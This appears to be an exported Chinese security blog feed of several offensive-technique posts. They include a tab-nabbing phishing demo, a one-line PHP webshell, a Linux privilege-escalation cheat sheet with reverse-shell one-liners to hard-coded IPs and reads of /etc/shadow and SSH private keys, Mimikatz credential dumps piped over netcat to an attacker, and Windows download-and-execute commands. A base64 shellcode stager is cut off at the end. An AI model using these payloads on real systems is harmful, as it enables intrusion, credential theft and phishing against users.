    <title><![CDATA[「前端钓鱼欺骗」前端黑魔法之远程控制地址栏]]></title>
    <url>%2Farchives%2F2db90a41.html</url>
    <content type="text"><![CDATA[由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示 首先可以看一个小例子： http://675ba661.w1n.pw/41593a见上图，打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。 0x02 原理说明上述页面的代码也很简单： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { setInterval(function() { baidu.href=&quot;http://675ba661.w1n.pw/baidu&quot;; baidu.click(); }, 10000); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《openresty+lua在反向代理服务中的玩法》中也有详细的介绍） 这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。 比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。 0x03 扩展尝试除了超链接以外，用window.open也可以达到一样的效果： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { var w = window.open(&apos;https://www.baidu.com&apos;, &apos;baidu&apos;); setInterval(function() { w.location = &apos;http://675ba661.w1n.pw/baidu&apos; }, 5000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。 那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？ 我们可以做一个实验。编写A页面（ http://a.675ba661.w1n.pw/A_victim ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello world.&lt;/p&gt; &lt;script&gt; window.name = &apos;baidu&apos;; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;编写B页面（ http://b.675ba661.w1n.pw/B_attacker ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&gt;click me&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置target=”baidu”。 显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。 0x04 总结本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。 但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。]]></content>
      <categories>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hashpump实现哈希长度扩展攻击]]></title>
    <url>%2Farchives%2Fa5b396d3.html</url>
    <content type="text"><![CDATA[Hashpump实现哈希长度扩展攻击]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型之md5_tips(ctf经常用到PHP弱类型)]]></title>
    <url>%2Farchives%2Fc26c2571.html</url>
    <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt; 这里md5(&apos;240610708&apos;) == &quot;0&quot; == 0e987654321 同样也相等.]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[最短php一句话]]></title>
    <url>%2Farchives%2Fe9bb571b.html</url>
    <content type="text"><![CDATA[&lt;?=`$_GET[1]`;]]></content>
      <categories>
        <category>随手笔记_待整理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux 提权常用命令集]]></title>
    <url>%2Farchives%2F27fa4050.html</url>
    <content type="text"><![CDATA[0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz-环境变量 cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set查看是否有打印机 lpstat -a0x01 应用与服务相关查看正在运行的程序及对应的用户权限 ps aux ps -ef top cat /etc/services以root权限运行的进程 ps aux | grep root ps -ef | grep root查看安装了的应用 ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/一些服务的配置文件 cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;计划任务 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root找存储的明文用户名，密码 grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla0x02 通信与网络相关查看当前网络地址 /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network查看网络配置,DNS,DHCP,网关 cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname查看网络通信 lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w查看缓存 arp -e route /sbin/route -nee tcpdump tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]交互式shellbash版本： bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1perl版本: perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;python版本: python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;php版本： php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;ruby版本： ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;nc版本： nc -e /bin/sh 223.8.200.234 1234nc不使用-e： mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipemknod: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipejava版本： r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()lua版本： lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;端口转发 lcx lcx -listen 4567 33891 #Attacker lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)隧道 ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig0x03 用户相关用户信息 id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户 awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l列家目录 ls -ahlR /root/ ls -ahlR /home/从配置文件里面寻找密码 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg看其他用户的操作记录 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_historyssh私钥 cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key0x04 文件系统相关/etc/目录下面文件 ls -aRl /etc/ | awk &apos;$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &apos;$1 ~ /^..w/&apos; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &apos;$1 ~ /^.....w/&apos; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &apos;$1 ~ /w.$/&apos; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone日志文件 ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases查看网站文件 ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/常见日志文件 cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/文件挂载 mount df -h cat /etc/fstabFind命令 find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录 find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行目录查找文件 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2&gt;/dev/null # 可写文件 find / dir -xdev \( -nouser -o -nogroup \) -print 2&gt;/dev/null # 无所有者文件0x05 准备及攻击查看语言支持 find / -name perl* find / -name python* find / -name gcc* find / -name cc查看上传方式 find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp寻找exp http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com编译exp which gcc gcc exp.c -o exp运行 chmod +x exp ./exp0x06 提权辅助脚本 LinEnum linuxprivchecker.py]]></content>
      <categories>
        <category>知识普及</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz 使用Tips]]></title>
    <url>%2Farchives%2Fe83f08e9.html</url>
    <content type="text"><![CDATA[Mimikatz 使用Tips1.记录 Mimikatz输出： C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir 2.将输出导入到本地文件： C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt3.将输出传输到远程机器：Attacker执行: E:\&gt;nc -lvp 4444Victim执行: C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444192.168.52.1 为Attacker IP 4.通过nc远程执行Mimikatz：Victim执行: C:\&gt;nc -lvp 443Attacker执行: E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe192.168.52.128 为Victim IP 5.hash传递 Privilege::debug sekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx之后会弹出cmd。]]></content>
      <categories>
        <category>知识普及</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows命令执行漏洞技巧]]></title>
    <url>%2Farchives%2Fd7cf94f6.html</url>
    <content type="text"><![CDATA[经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz2、regsvr32regsvr32 /u /s /i:http://site.com/js.png scrobj.dlljs.png&lt;?XML version=&quot;1.0&quot;?&gt; &lt;scriptlet&gt; &lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;cmd.exe /c calc.exe&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt; &lt;/script&gt; &lt;/registration&gt; &lt;/scriptlet&gt;rundll32eg: rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%细节:https://github.com/3gstudent/Javascript-Backdoor mshta1） mshta http://site.com/calc.hta 2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))calc.hta&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;calc.exe&quot; self.close &lt;/script&gt; &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt; &lt;/HTML&gt;pubprn.vbscscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct6、bitsadmineg: cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe7、python（需安装）eg: python -c &quot;import urllib2; exec urllib2.urlopen(&apos;http://site.com/abc&apos;).read();&quot; abc import base64; exec base64.b64decode(&quot;aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4